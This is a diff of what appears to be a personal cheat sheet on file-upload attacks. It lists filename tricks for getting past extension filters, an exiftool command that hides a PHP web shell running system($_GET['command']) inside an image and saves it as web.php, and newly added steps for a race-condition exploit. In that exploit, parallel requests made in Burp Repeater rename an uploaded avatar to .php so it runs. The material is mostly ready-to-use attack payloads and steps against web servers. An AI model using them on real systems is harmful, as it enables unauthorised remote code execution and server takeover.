@@ -22,6 +22,18 @@ exploit.asp;.jpg
 exploit%2Ephp
 
 =====================================##########################===================================
-
  exiftool -Comment="<?php echo system($_GET['command']); ?>" creator
 .png -o web.php
+
+====================================####################=============================
+
+1 : upload jpg/png image and cap the request and send the request to repeater. [1st request]
+2: After upload the image cap the Get reequest like :- https://target.com/files/avatars/aman.jpg [2nd request] and change aman.png to aman.php.
+
+Copy 5 or 6 request in repeater and create a tab group and all the request in it then "Send group in parallel (single packet)"
+
+Check all the 2nd request,  Probably one request may successfully execute
+
+=====================================######################================================
+
+
